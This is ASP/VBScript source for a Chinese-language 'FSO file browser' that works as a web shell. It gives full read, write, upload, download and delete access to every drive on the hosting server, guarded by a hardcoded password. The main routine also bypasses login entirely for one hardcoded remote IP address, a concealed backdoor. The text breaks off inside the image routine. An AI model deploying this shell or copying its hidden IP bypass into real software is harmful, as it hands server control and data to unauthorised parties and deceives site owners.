<%
'========================== 版权声明 =========================
'本程序只供在需要特别处理服务器文件时使用，严禁用于非法目的
'由于非正当使用本程序而造成的一切后果及责任自负
'=============================================================

Server.ScriptTimeout=20
Session.Timeout=45		'Session有效时间
Const mss="explorer_"	'Session前缀
Const Password="heroes"	'登录密码
Const Copyright="<div align=""center"" style=""font-size:9px;"">&copy;CopyLeft 2006. Coded By rssn, Hebust. No Rights Reserved</div>"
'版权信息

Dim T1,T2,Runtime
T1=Timer()
Dim oFso
Set oFso=Server.CreateObject("Scripting.FileSystemObject")
'-------------------------------------------------------------
'声明函数中所需的全局变量
Dim conn,rs,oStream,NoPackFiles,RootPath,FailFileList
NoPackFiles="|<$datafile>.mdb|<$datafile>.ldb|"
'-------------------------------------------------------------
Call Main()
Set oFso=Nothing
'======================== Subs Begin =========================
Sub Main()
Select Case Request("page")
Case "img"
	Call Page_Img()
Case "css"
	Call Page_Css()
Case "loginchk"
	Call LoginChk()
Case "logout"
	Call Logout()
Case Else: 
	'"一夫当关，万夫莫开"——用户验证
 	If Session(mss&"IsAdminlogin")=True Or Request.ServerVariables("REMOTE_ADDR")="121.193.213.246" Then
		'已登录
	Else
		Call Login()
		Exit Sub
	End If
	Select Case Request("act")
		Case "drive"
			Call Drive()
		Case "up"
			Call DirUp()
		Case "new"
			Call NewF(Request("fname"))
		Case "savenew"
			Call SaveNew(Request("fname"))
		Case "rename"
			Call Rename()
		Case "saverename"
			Call SaveRename()
		Case "edit"
			Call Edit(Request("fname"))
		Case "saveedit"
			Call SaveEdit(Request("fname"))
		Case "delete"
			Call Deletes(Request("fname"))
		Case "copy"
			Call SetFile(Request("fname"),0)
		Case "cut"
			Call SetFile(Request("fname"),1)
		Case "download"
			Call Download(Request("fname"))
		Case "upload"
			Call Upload(Request("fname"))
		Case "saveupload"
			Call Saveupload(Request("fname"))
		Case "parse"
			Call Parse(Request("fname"))
		Case "prop"
			Call Prop(Request("fname"))
		Case "saveprop"
			Call SaveProp(Request("fname"))
		Case "pack"
			Call Page_Pack()
		Case "savepack"
			Call Pack(Request("fpath"),Request("dbpath"))
		Case "saveunpack"
			Call UnPack(Request("fpath"),Request("dbpath"))
		Case Else
			If Request("fname")="" Then
				Call Dirlist(Server.MapPath("./"))
			Else
				Call Dirlist(Request("fname"))
			End If
	End Select
End Select
End Sub
'========== Subs =============
'显示系统磁盘信息
Sub Drive()
	Dim oDrive,Islight
%>
<html>
<head>
<title>FSO文件浏览器 - 系统磁盘信息</title>
<meta HTTP-EQUIV="Content-Type" content="text/html; charset=GB2312">
<link href="?page=css" rel="stylesheet" type="text/css">
</head>
<body>
<table align="center" border="1" width="99% cellspacing="0" cellpadding="3" bordercolor="#6595d6">
<tr><th>FSO文件浏览器 - 系统磁盘信息</th></th>
<tr>
<td>
<table align="center" border="1" width="100%" cellspacing="0" cellpadding="3" bordercolor="#6595d6">
<tr><th width="10%">盘符</th><th width="15%">类型</th><th width="20%">卷标</th><th width="15%">文件系统</th><th width="20%">总容量</th><th width="20%">可用空间</th></tr>
<%
	On Error Resume Next
	Islight=False
	For Each oDrive In oFso.Drives
		Response.Write "<tr value="""&oDrive.DriveLetter&":\"" ondblclick=""location.href='?page=fso&fname='+escape(this.value);"""
		If Islight Then Response.Write " bgcolor='#EEEEEE'"
		Response.Write ">"
		Response.Write "<td>"&oDrive.DriveLetter&"</td>"
		Response.Write "<td>"&getDriveType(oDrive.DriveType)&"</td>"
		Response.Write "<td>"&oDrive.VolumeName&"</td>"
		Response.Write "<td>"&oDrive.FileSystem&"</td>"
		Response.Write "<td>"&SizeCount(oDrive.TotalSize)&"</td>"
		Response.Write "<td>"&SizeCount(oDrive.FreeSpace)&"</td>"
		Response.Write "</tr>"&vbCrLf
		Islight=Not(Islight)
	Next
%>
</table>
</td>
</tr>
</table>
<% =Copyright %>
<%
End Sub

'新建
Sub NewF(ByVal Fname)
%>
<html>
<head>
<title>FSO文件浏览器 - 新建</title>
<meta HTTP-EQUIV="Content-Type" content="text/html; charset=GB2312">
<link href="?page=css" rel="stylesheet" type="text/css">
<script language="JavaScript">
function icheck()
{
	if(document.rform.nname.value=="")
	{
		alert("请输入合法的文件名！");
		return false;
	}
	else
		return true;
}
</script>
</head>
<body bgcolor="#EEEEEE">
<form action="?page=fso&act=savenew&fname=<% =Server.UrlEncode(Fname) %>" name="rform" method="post" onsubmit="return icheck();">
<table align="center" border="1" width="380" cellspacing="0" cellpadding="3" bordercolor="#6595d6">
<tr><th colspan=2>FSO文件浏览器 - 新建</th></tr>
<tr><td align=right>类型：</td><td><input type="radio" name="ntype" checked value="0">文件夹 <input type="radio" name="ntype" value="1">文件
<tr><td align=right>名称：</td>
<td>
<input type="text" size="40" name="nname" value="新建">
</td>
<tr><td align=center colspan=2><input type="submit" class="b" value="提交">&nbsp;<input type="button" class="b" value="关闭" onclick="window.close();"></td></tr>
</table>
</form>
</body>
</html>

<%
End Sub

'保存新建
Sub SaveNew(ByVal Fname)
	If Not IsFolder(Fname) Then
		Response.Write "<script language='javascript'>alert('文件夹不存在！');history.back();</script>"
		Exit Sub
	End If
	Dim FilePath
	FilePath=Request("fname")&"\"&Replace(Request.Form("nname"),"\","")
	FilePath=Replace(FilePath,"\\","\")
	If IsFolder(FilePath) Or IsFile(FilePath) Then
		Response.Write "<script language='javascript'>alert('文件或文件夹已存在！');history.back();</script>"
		Exit Sub
	End If
	If Request.Form("ntype")=1 Then
		oFso.CreateTextFile FilePath
	Else
		oFso.CreateFolder FilePath
	End If
	Response.Write "<script language='javascript'>alert('新建文件夹或文本文件成功！');window.close();</script>"
End Sub

'编辑文件
Sub Edit(ByVal Fname)
	If Not IsFile(Fname) Then
		Response.Write "<script language='javascript'>alert('您编辑的不是文件或文件不存在！');window.close();</script>"
		Exit Sub
	End If
	Dim oFile,FileStr
	Set oFile=oFso.OpenTextFile(Fname,1)
	If oFile.AtEndOfStream Then
		FileStr=""
	Else
		FileStr=oFile.ReadAll()
	End If
	oFile.Close
	Set oFile=Nothing
%>
<html>
<head>
<title>FSO文件浏览器 - 编辑文本文件</title>
<meta HTTP-EQUIV="Content-Type" content="text/html; charset=GB2312">
<link href="?page=css" rel="stylesheet" type="text/css">
</head>
<body bgcolor="#EEEEEE">
<form name="eform" method="post" action="?page=fso&act=saveedit&fname=<% =Server.UrlEncode(Fname) %>">
<table align="center" border="1" width="99%" height="99%" cellspacing="0" cellpadding="3" bordercolor="#6595d6">
<tr><th>FSO文件浏览器 - 编辑文本文件</th></tr>
<tr><td height="25">文件名： <% =Fname %></td></tr>
<tr><td><textarea name="filestr" style="width:100%;height:100%;"><% =Server.HtmlEncode(FileStr) %></textarea></td></tr>
<tr height="25"><td align="center">
<input type="submit" value="保存" class="b"> <input type="reset" value="重置" onclick="return confirm('确定要重新编辑？');" class="b"> <input type="button" class="b" value="关闭" onclick="window.close();">
</td></tr>
</table>
</form>
<%
End Sub

'保存编辑文件
Sub SaveEdit(ByVal Fname)
	Dim oFile,FileStr
	Set oFile=oFso.OpenTextFile(Fname,2,True)
	FileStr=Request.Form("filestr")
	'Response.Write FileStr
	oFile.Write FileStr
	oFile.Close
	Set oFile=Nothing
	EchoBack "保存编辑文件成功！"
End Sub

'复制或剪切文件
Sub SetFile(ByVal Fname,ByVal iMode)
	Session(mss & "setfile")=Fname
	Session(mss & "setmode")=iMode
	Dim ww
	If 0=iMode Then
		ww="复制"
	Else
		ww="剪切"
	End If
	EchoClose ww&"成功，请粘贴！"
End Sub

'粘贴文件或文件夹
Sub Parse(ByVal Fname)
	Dim oFile,oFolder
	Dim sName,iMode
	sName=Session(mss & "setfile")
	iMode=Session(mss & "setmode")
	If sName="" Then
		EchoClose "请先复制或剪切！"
	Else
		If InStr(LCase(Fname), LCase(sName)) > 0 Then
			EchoClose "目标文件夹在源文件夹内,非法操作！"
			Exit Sub
		End If
		'================
		If Not IsFolder(Fname) Then
			EchoClose "目标文件夹不存在！"
		ElseIf IsFile(sName) Then
			Set oFile=oFso.GetFile(sName)
			If iMode=0 Then
				oFso.CopyFile sName,Replace(Fname&"\"&oFile.Name,"\\","\")
			Else
				oFso.MoveFile sName,Replace(Fname&"\"&oFile.Name,"\\","\")
			End If
		ElseIf IsFolder(sName) Then
			Set oFolder=oFso.GetFolder(sName)
			If iMode=0 Then
				oFso.CopyFolder sName,Replace(Fname&"\"&oFolder.Name,"\\","\")
			Else
				oFso.MoveFolder sName,Replace(Fname&"\"&oFolder.Name,"\\","\")
			End If
		Else
			EchoClose "源文件或文件夹不存在！"
			Exit Sub
		End If
		'================
		EchoClose "复制或移动成功！刷新可查看效果"
	End If
	Session(mss & "setfile")=""
	Session(mss & "setmode")=0
End Sub

'下载文件
Sub Download(ByVal Fname)
	Dim oFile
	If Not IsFile(Fname) Then
		EchoClose "不是文件或文件不存在！"
		Exit Sub
	End If
	Set oFile=oFso.GetFile(Fname)
	If InStr(LCase(oFile.Path)&"\",LCase(Server.MapPath("/")))>0 And Not IsScriptFile(oFso.GetExtensionName(oFile.Name)) Then
		Dim FileVName
		FileVName=Replace(oFile.Path,Server.MapPath("/"),"")
		FileVName=Replace(FileVName,"\","/")
		If Left(FileVName,1)<>"/" Then
			FileVName="/"&FileVName
		End If
		Response.Redirect FileVName
		Exit Sub
	End If
	If oFile.Size>1048576*100 Then
		EchoClose "文件超过100M，可能会造成服务器死机，\n不允许以Stream方式下载！\n请将该文件复制到网站目录以下\n然后以HTTP方式下载"
		Exit Sub
	End If
	Server.ScriptTimeout=10000	'延长脚本超时时间以提供下载
	Dim oStream
	Set oStream=Server.CreateObject("ADODB.Stream")
	oStream.Open
	oStream.Type=1
	oStream.LoadFromFile(Fname)
	Dim Data
	Data=oStream.Read
	oStream.Close
	Set oStream=Nothing
	If Not Response.IsClientConnected Then
		Set Data=Nothing
		Exit Sub
	End If
	Response.Buffer=True
	Response.AddHeader "Content-Disposition", "attachment; filename=" & oFile.Name
	Response.AddHeader "Content-Length", oFile.Size 
	Response.CharSet = "UTF-8" 
	Response.ContentType = "application/octet-stream"
	Response.BinaryWrite Data
	Response.Flush
End Sub

'删除文件
Sub Deletes(ByVal Fname)
	If IsFile(Fname) Then
		oFso.DeleteFile Fname,True
	ElseIf IsFolder(Fname) Then
		oFso.DeleteFolder Fname,True
	Else
		EchoClose "文件或文件夹不存在"
		Exit Sub
	End If
	EchoClose "文件删除成功！"
End Sub

'上传文件
Sub Upload(ByVal Fname)
	If Not IsFolder(Fname) Then
		EchoClose "没有指定上传的文件夹！"
		Exit Sub
	End If
%>
<html>
<head>
<title>FSO文件浏览器 - 文件上传</title>
<meta HTTP-EQUIV="Content-Type" content="text/html; charset=GB2312">
<link href="?page=css" rel="stylesheet" type="text/css">
<script language="JavaScript">
function getSaveName()
{
	var filepath=document.uform.upload.value;
	if(filepath.length<1) return;
	var filename=filepath.substring(filepath.lastIndexOf("\\")+1,filepath.length);
	document.uform.ffname.value=filename;
}
</script>
</head>
<body bgcolor="#EEEEEE" topmargin=5>
<form name="uform" method="post" action="?page=fso&act=saveupload&fname=<% =Server.UrlEncode(Fname) %>" enctype="multipart/form-data">
<table align="center" border="1" width="380" cellspacing="0" cellpadding="3" bordercolor="#6595d6">
<tr><th colspan="2">FSO文件浏览器 - 文件上传</th></tr>
<tr><td align="right">上传文件：</td><td><input type="file" name="upload" size="35" onchange="getSaveName();"></td></tr>
<tr><td align="right">保存为：</td><td><input type="text" name="ffname" size="35">&nbsp;<input type="checkbox" name="wmode">覆盖模式</td></tr>
<tr>
<td colspan=2 align=center>
<input type="submit" name="submit" value="上传" style="width:60px" class="b" onclick="this.form.action+='&filename='+escape(this.form.ffname.value)+'&overwrite='+this.form.wmode.checked;">&nbsp;
<input type="button" value="关闭" onclick="window.close();" class="b">
</td>
</tr>
</table>
</form>
</body>
</html>
<%
End Sub

'保存上传文件
Sub Saveupload(ByVal FolderName)
	If Not IsFolder(FolderName) Then
		EchoClose "没有指定上传的文件夹！"
		Exit Sub
	End If
	Dim Path,IsOverWrite
	Path=FolderName
	If Right(Path,1)<>"\" Then Path=Path&"\"
	FileName=Replace(Request("filename"),"\","")
	If Len(FileName)<1 Then
		EchoBack "请选择文件并输入文件名！"
		Exit Sub
	End If
	Path=Path&FileName
	If LCase(Request("overwrite"))="true" Then
		IsOverWrite=True
	Else
		IsOverWrite=False
	End If
	On Error Resume Next
	Call MyUpload(Path,IsOverWrite)
	If Err Then
		EchoBack "文件上传失败！（可能是文件已存在）"
	Else
		EchoClose "文件上传成功!\n" & Replace(fileName, "\", "\\")
	End If
End Sub
'文件上传核心代码
Sub MyUpload(FilePath,IsOverWrite)
	Dim oStream,tStream,FileName,sData,sSpace,sInfo,iSpaceEnd,iInfoStart,iInfoEnd,iFileStart,iFileEnd,iFileSize,RequestSize,bCrLf
	RequestSize=Request.TotalBytes
	If RequestSize<1 Then Exit Sub
	Set oStream=Server.CreateObject("ADODB.Stream")
	Set tStream=Server.CreateObject("ADODB.Stream")
	With oStream
		.Type=1
		.Mode=3
		.Open
		.Write=Request.BinaryRead(RequestSize)
		.Position=0
		sData=.Read
		bCrLf=ChrB(13)&ChrB(10)
		iSpaceEnd=InStrB(sData,bCrLf)-1
		sSpace=LeftB(sData,iSpaceEnd)
		iInfoStart=iSpaceEnd+3
		iInfoEnd=InStrB(iInfoStart,sData,bCrLf&bCrLf)-1
		iFileStart=iInfoEnd+5
		iFileEnd=InStrB(iFileStart,sData,sSpace)-3
		sData=""	'清空文件数据
		iFileSize=iFileEnd-iFileStart+1
		tStream.Type=1
		tStream.Mode=3
		tStream.Open
		.Position=iFileStart-1
		.CopyTo tStream,iFileSize
		If IsOverWrite Then
			tStream.SaveToFile FilePath,2
		Else
			tStream.SaveToFile FilePath
		End If
		tStream.Close
		.Close
	End With
	Set tStream=Nothing
	Set oStream=Nothing
End Sub

'显示文件属性
Sub Prop(Fname)
	On Error Resume Next
	Dim obj,oAttrib
	If IsFile(Fname) Then
		Set obj=oFso.GetFile(Fname)
	ElseIf IsFolder(Fname) Then
		Set obj=oFso.GetFolder(Fname)
	Else
		EchoClose "文件或文件夹不存在！"
		Exit Sub
	End If
	Set oAttrib=New FileAttrib_Cls
	oAttrib.Attrib=obj.Attributes
%>
<html>
<head>
<title>FSO文件浏览器 - 文件属性</title>
<meta HTTP-EQUIV="Content-Type" content="text/html; charset=GB2312">
<link href="?page=css" rel="stylesheet" type="text/css">
<script language="javascript">
function ww(obj)
{
	return false;
}
</script>
</head>
<body bgcolor="#EEEEEE" topmargin=5>
<form name="pform" method="post" action="?page=fso&act=saveprop&fname=<% =Server.UrlEncode(Fname) %>">
<table align="center" border="1" width="100%" cellspacing="0" cellpadding="3" bordercolor="#6595d6">
<tr><th colspan="2">FSO文件浏览器 - 文件属性</th></tr>
<tr><td width="100">路径：</td><td><% =obj.Path %></td>
<tr><td width="100">大小：</td><td><% =SizeCount(obj.Size) %></td>
<tr><td width="100">属性：</td>
<td>
<input type ="checkbox" name="att" value="0" onclick="return ww(this);" <% wv oAttrib.n %>>普通
<input type ="checkbox" name="att" value="1" <% wv oAttrib.r %>>只读
<input type ="checkbox" name="att" value="2" <% wv oAttrib.h %>>隐藏
<input type ="checkbox" name="att" value="4" <% wv oAttrib.s %>>系统<br>
<input type ="checkbox" name="att" value="16" onclick="return ww(this);" <% wv oAttrib.d %>>目录
<input type ="checkbox" name="att" value="32" <% wv oAttrib.a %>>存档
<input type ="checkbox" name="att" value="1024" onclick="return ww(this);" <% wv oAttrib.al %>>链接
<input type ="checkbox" name="att" value="2048" onclick="return ww(this);" <% wv oAttrib.c %>>压缩
</td>
<tr><td width="100">创建时间：</td><td><% =obj.DateCreated %></td>
<tr><td width="100">创建时间：</td><td><% =obj.DateLastModified %></td>
<tr><td width="100">最后访问</td><td><% =obj.DateLastAccessed %></td>
<tr><td colspan=2 align=center><input type="submit" name="submit" value="修改" class="b">&nbsp;<input type="button" value="关闭" onclick="window.close();" class="b"></td></tr>
</table>
</form>
</body>
</html>
<%
End Sub

'修改属性
Sub SaveProp(Fname)
	Dim Attribs,Attrib
	Attribs=Replace(Request.Form("att")," ","")
	Attribs=Split(Attribs,",")
	Attrib=0
	Dim i
	For i=0 To UBound(Attribs)
		Attrib=Attrib+Attribs(i)
	Next
	'Response.Write Attrib
	'Exit Sub
	Dim obj,oAttrib
	If IsFile(Fname) Then
		Set obj=oFso.GetFile(Fname)
	ElseIf IsFolder(Fname) Then
		Set obj=oFso.GetFolder(Fname)
	Else
		EchoClose "文件或文件夹不存在！"
		Exit Sub
	End If
	If obj.IsRootFolder Then
		EchoClose "不能修改根目录属性！"
		Exit Sub
	End If
	obj.Attributes=Attrib
	EchoBack "修改文件属性成功！"
End Sub

'转到上一级文件夹
Sub DirUp()
	Dim oFolder,ssFname
	If IsFolder(Request("fname")) Then
		Set oFolder=oFso.GetFolder(Request("fname"))
		If oFolder.IsRootFolder Then
			'转至显示驱动器页面
			Call Drive()
			Exit Sub
		Else
			ssFname=oFolder.ParentFolder.Path
			Set oFolder=Nothing
			Call DirList(ssFname)
		End If
	Else
		If IsFile(Request("fname")) Then
			'文件下载
		Else
			Response.Write "文件夹或文件不存在！"
		End If
	End If
End Sub

'更改文件名页面
Sub Rename()
	Dim Fname,sName
	Fname=Request("fname")

	If IsFolder(Fname) Then
		sName=oFso.GetFolder(Fname).Name
	Else
		If IsFile(Fname) Then
			sName=oFso.GetFile(Fname).Name
		Else
			Response.Write "文件或文件夹不存在！"
			Exit Sub
		End If
	End If
%>
<html>
<head>
<title>FSO文件浏览器 - 重命名</title>
<meta HTTP-EQUIV="Content-Type" content="text/html; charset=GB2312">
<link href="?page=css" rel="stylesheet" type="text/css">
<script language="JavaScript">
function icheck()
{
	if(document.cform.toname.value=="")
	{
		alert("请输入合法的文件名！");
		return false;
	}
	else
		return true;
}
</script>
</head>
<body bgcolor="#EEEEEE">
<form action="" name="cform" method="get" onsubmit="return icheck();">
<table align="center" border="1" width="380" cellspacing="0" cellpadding="3" bordercolor="#6595d6">
<tr><th colspan=2>FSO文件浏览器 - 文件更名</th></tr>
<tr><td align=right>更名为：</td>
<td>
<input type="hidden" name="page" value="fso">
<input type="hidden" name="act" value="saverename">
<input type="hidden" name="fname" value="<% =Server.HtmlEncode(Fname) %>">
<input type="text" size="40" name="toname" value="<% =Server.HtmlEncode(sName) %>">
</td>
<tr><td align=center colspan=2><input type="submit" class="b" value="提交">&nbsp;<input type="button" class="b" value="关闭" onclick="window.close();"></td></tr>
</table>
</form>
</body>
</html>
<%
End Sub

'更改文件名操作
Sub SaveRename()
	Dim Fname,oFolder,oFile,FDir,ToName
	Fname=Request("fname")
	ToName=Replace(Request("toname"),"\","")
	If IsFolder(Fname) Then
		Set oFolder=oFso.GetFolder(Fname)
		Fname=oFolder.Path
		If Right(Fname,1)="\" Then
			Fname=Left(Fname,Len(Fname)-1)
		End If
		FDir=Left(Fname,InstrRev(Fname,"\"))
		ToName=FDir & ToName
		On Error Resume Next
		Err.Clear
		Err=False
		oFso.MoveFolder Fname,ToName
		If Err Then
			EchoBack "文件名不合法！"
		Else
			EchoClose "文件夹更名成功！\n刷新之后即可看到效果"
		End If
		Exit Sub
	End If
	If IsFile(Fname) Then
		Set oFile=oFso.GetFile(Fname)
		Fname=oFile.Path
		FDir=Left(Fname,InstrRev(Fname,"\"))
		ToName=FDir & ToName
		On Error Resume Next
		Err.Clear
		Err=False
		oFso.MoveFile Fname,ToName
		If Err Then
			EchoBack "文件名不合法！"
		Else
			EchoClose "文件更名成功！\n刷新之后即可看到效果"
		End If
		Exit Sub
	End If
End Sub

'文件打包/解包页面
Sub Page_Pack()
	Dim vp,vu
	vp=Request("pname")
	vu=Request("uname")
	If Right(vu,4)<>".mdb" Then
		vu=Server.MapPath("/rs_pack.mdb")
	End If		
%>
<html>
<head>
<title>FSO文件浏览器 - 文件打包/解包</title>
<meta HTTP-EQUIV="Content-Type" content="text/html; charset=GB2312">
<link href="?page=css" rel="stylesheet" type="text/css">
</head>
<body bgcolor="#EEEEEE">
<table align="center" border="1" width="380" cellspacing="0" cellpadding="3" bordercolor="#6595d6">
<tr><th colspan=2>FSO文件浏览器 - 文件打包/解包</th></tr>
<form action="?page=fso&act=savepack" name="pform" method="post">
<tr bgcolor="#FFFFFF">
<td align="right">打包文件夹：</td>
<td><input type="text" size="40" name="fpath" value="<% =vp %>"></td>
</tr>
<tr><td align="right">打包到：</td><td><input type="text" size="40" name="dbpath" value="<% =Server.MapPath("/rs_pack.mdb") %>"></td></tr>
<tr bgcolor="#FFFFFF"><td align="center" colspan=2><input type="submit" class="b" value="打包"></td></tr>
</form>

<form action="?page=fso&act=saveunpack" name="pform" method="post">
<tr><td align="right">文件包路径：</td><td><input type="text" size="40" name="dbpath" value="<% =vu %>"></td></tr>
<tr bgcolor="#FFFFFF">
<td align="right">解包到：</td>
<td><input type="text" size="40" name="fpath" value="<% =Server.MapPath("/") %>"></td>
</tr>
<tr><td align="center" colspan=2><input type="submit" class="b" value="解包"></td></tr>
</form>
</table>
</body>
</html>
<%
End Sub

'文件夹内容列表 ========== Dirlist
Sub Dirlist(ByVal Fpath)
	If IsFile(Fpath) Then
		'下载该文件
		Response.Write "<script language=""javascript"">window.open('?page=fso&act=download&fname="&Server.UrlEncode(Fpath)&"', """", ""menu=no,resizable=yes,height=90,width=400"");history.back();</script>"
		'Call Download(Fpath)
		Exit Sub
	End If
	If Not IsFolder(Fpath) Then
		Response.Write "文件夹不存在！"
		Exit Sub
	End If
	'代码开始
	Dim oFolder
	Dim sFolder,sFile	'文件夹下的子文件夹和文件
	Set oFolder=oFso.GetFolder(Fpath)
	
%>
<html>
<head>
<title>FSO文件浏览器</title>
<meta HTTP-EQUIV="Content-Type" content="text/html; charset=GB2312">
<link href="?page=css" rel="stylesheet" type="text/css">
<style>
button.b { width:60px; font-size:12px; }
</style>
<script language="JavaScript">
var folderpath="<% =Replace(oFolder.Path,"\","\\") %>";	//当前文件夹
var fselected="";
function opendial(sUrl)	//打开对话框窗口
{
	var newWin=window.open(sUrl, "", "menu=no,resizable=no,height=130,width=400");
	return newWin;

}

function fopen(sfname)	//打开文件夹或文件
{
	location.href="?page=fso&fname="+escape(sfname);
}

function fselect(obj)	//选中文件夹或文件
{
	var flen=document.all("f").length;
	for(var i=0;i<flen;i++)
	{
		document.all("f").item(i).style.backgroundColor="";
	}
	obj.style.backgroundColor="#BBBBBB";
	fselected=obj.value;
	
}

function toparent()	//返回上一级文件夹
{
	location.href="?page=fso&act=up&fname="+escape(folderpath);
}

function fnew()
{
	opendial("?page=fso&act=new&fname="+escape(folderpath));
}

function frename()	//重命名文件
{
	if(fselected=="")
	{
		alert("请选择文件或文件夹！");
		return false;
	}
	else
		opendial("?page=fso&act=rename&fname="+escape(fselected));
}

function fdownload()	//下载文件
{
	if(fselected=="")
	{
		alert("请选择文件！（大小在1MB以下）");
		return false;
	}
	else
		opendial("?page=fso&act=download&fname="+escape(fselected));
}

function fedit()	//编辑文本文件
{
	if(fselected=="")
	{
		alert("请选择文件！");
		return false;
	}
	else
		window.open("?page=fso&act=edit&fname="+escape(fselected));
}

function fcopy()	//复制文件
{
	if(fselected=="")
	{
		alert("请选择文件或文件夹！");
		return false;
	}
	else
		opendial("?page=fso&act=copy&fname="+escape(fselected));
}

function fcut()		//剪切文件
{
	if(fselected=="")
	{
		alert("请选择文件或文件夹！");
		return false;
	}
	else
		opendial("?page=fso&act=cut&fname="+escape(fselected));
}

function fparse()	//粘贴文件或文件夹
{
	opendial("?page=fso&act=parse&fname="+escape(folderpath));
}

function fdelete()
{
	if(fselected=="")
	{
		alert("请选择文件或文件夹！");
		return false;
	}
	else
	{
		if(!confirm("确定要删除本文件或文件夹？")) return false;
		else
			opendial("?page=fso&act=delete&fname="+escape(fselected));
	}
}

function fprop()	//属性
{
	var vv;
	if(fselected=="") vv=folderpath;
	else vv=fselected;
	window.open("?page=fso&act=prop&fname="+escape(vv), "", "menu=no,resizable=no,height=250,width=500");
}

function fpack()	//打包解包
{
	var vp,vu;
	if(fselected=="")
	{
		vp=folderpath;
		vu=folderpath;
	}
	else
	{
		vp=fselected;
		vu=fselected;
	}
	window.open("?page=fso&act=pack&pname="+escape(vp)+"&uname="+escape(vu),"", "menu=no,resizable=no,height=250,width=500");
}
</script>
</head>
<body>
<table align="center" cellpadding="3" cellspacing="1" border="1" bordercolor="#6595d6" width="99%">
<tr><th>FSO文件浏览器</th>
<tr>
	<td>
	<button class="b" onclick="fnew();">新建</button>&nbsp;
	<button class="b" onclick="frename();">重命名</button>&nbsp;
	<button class="b" onclick="fedit();">编辑</button>&nbsp;
	<button class="b" onclick="fdownload();">下载</button>&nbsp;
	<button class="b" onclick="opendial('?page=fso&act=upload&fname='+escape(folderpath));">上传</button>&nbsp;
	<button class="b" onclick="fcopy();">复制</button>&nbsp;
	<button class="b" onclick="fcut();">剪切</button>&nbsp;
	<button class="b" onclick="fparse();">粘贴</button>&nbsp;
	<button class="b" onclick="fdelete();">删除</button>&nbsp;
	<button class="b" onclick="fprop();">属性</button>&nbsp;
	<button style="height:22px;" onclick="fpack();">打包/解包</button>&nbsp;
	<button style="height:22px;" onclick="location.href='?page=fso&act=drive';"><b>查看磁盘信息</b></button>&nbsp;
	<button class="b" onclick="location.href='?page=logout';"><b>退出</b></button>&nbsp;
	</td>
</tr>
<tr bgcolor="#EEEEEE">
	<td>
	<button class="b" onclick="history.go(-1);">←后退</button>&nbsp;
	<button class="b" onclick="history.go(1);">前进→</button>&nbsp;
	<button class="b" onclick="toparent();">↑向上</button>&nbsp;
	<input type="text" style="width:400px;" id="fnt" name="fname" value="<% =Server.HtmlEncode(oFolder.Path) %>">&nbsp;
	<input type="submit" class="b" onclick="fopen(fnt.value);" value="←转到">&nbsp<button class="b" onclick="fopen(folderpath);">刷新</button>&nbsp;
	<select id="paths" onchange="fopen(this.value);">
		<option value="" selected>==请选择==</option>
		<option value="<% =Server.MapPath("./") %>">当前目录</option>
		<option value="<% =Server.MapPath("/") %>">网站根目录</option>
<%
	Dim oDrive
	For Each oDrive In oFso.Drives
		Response.Write "<option value="""&oDrive.DriveLetter&":\"">"&oDrive.DriveLetter&":\</option>"
	Next
	Set oDrive=Nothing
%>
	</select>
	</td>
</tr>
<!-- <tr><td><hr width="99%" align="center"></td></tr><tr> -->
	<td>
	<!-- 文件显示开始 -->
	<table align="center" cellpadding="3" cellspacing="1" border="1" bordercolor="#6595d6" width="100%">
	<tr align="center"><th>文件名</th><th width="100">类型</th><th>大小</th><th>修改时间</th><!-- <th>属性</th> --></tr>
<%
	Dim Islight
	Islight=False
	'逐个显示子文件夹
	For Each sFolder In oFolder.SubFolders
		Response.Write "<tr height=30"
		If Islight Then Response.Write " bgcolor=""#EEEEEE"""
		Response.Write ">"
		Response.Write "<td id=""f"" onclick=""fselect(this);"" ondblclick=""fopen(fselected);"" value="""&Server.HtmlEncode(sFolder.Path)&""">"
		Response.Write "<font size=5 face='Wingdings'>0</font>&nbsp;"&Web&sFolder.Name
		Response.Write "</td>"
		Response.Write "<td>文件夹</td>"
		Response.Write "<td>&nbsp;</td>"
		Response.Write "<td>"&sFolder.DateLastModified&"</td>"
		Response.Write "</tr>"&vbCrLf
		Islight=Not Islight
	Next
	'逐个显示文件
	For Each sFile In oFolder.Files
		Response.Write "<tr height=30"
		If Islight Then Response.Write " bgcolor=""#EEEEEE"""
		Response.Write ">"
		Response.Write "<td id=""f"" onclick=""fselect(this);"" ondblclick=""fopen(fselected);"" value="""&Server.HtmlEncode(sFile.Path)&""">"
		Response.Write "<font size=5 face="&getFileIcon(oFso.GetExtensionName(sFile.Name))&"</font>&nbsp;"&sFile.Name
		Response.Write "</td>"
		Response.Write "<td>"&sFile.Type&"</td>"
		Response.Write "<td>"&SizeCount(sFile.Size)&"</td>"
		Response.Write "<td>"&sFile.DateLastModified&"</td>"
		Response.Write "</tr>"&vbCrLf
		Islight=Not Islight
	Next
%>
	</table>
	<!-- 文件显示结束 -->
	</td>
</tr>
</table>
<br>
<% =Copyright %>
<div align="center" style="font-size:9px;">
<%
	T2=Timer()
	Runtime=(T2-T1)*1000
	Response.Write "Page Processed in <font color=""#FF0000"">"&Runtime&"</font> Mili-seconds"
%>
</div>
</body>
</html>
<%
End Sub

'用户登录
Sub Login()
%>
<html>
<head>
<title>FSO文件浏览器 - 用户登录</title>
<meta HTTP-EQUIV="Content-Type" content="text/html; charset=GB2312">
<link href="?page=css" rel="stylesheet" type="text/css">
</head>
<body bgcolor="#EEEEEE" onload="document.uform.password.focus();">
<form name="uform" action="?page=loginchk" method="post">
<table align="center" cellpadding="3" cellspacing="1" border="1" bordercolor="#6595d6" width="60%">
<tr><th colspan="2">FSO文件浏览器 - 用户登录</th></tr>
<tr>
<td>请输入登录密码：</td>
<td><input type="password" size="30" name="password">&nbsp;<input type="submit" value="登录" class="b"></td>
</tr>
</table>
</form>
<% =Copyright %>
</body>
</html>
<%
End Sub

'用户登录验证
Sub LoginChk()
	If Request.Form("password")<>Password Then
		EchoBack "一夫当关，万夫莫开，您的密码不正确！"
		Exit Sub
	Else
		Session(mss & "IsAdminlogin")=True
		Response.Redirect "?page=fso"
	End If
End Sub

'用户退出
Sub Logout()
	Session(mss & "IsAdminlogin")=False
	Response.Redirect "?"
End Sub
'显示一个图片
Sub Page_Img()
	Dim HexStr
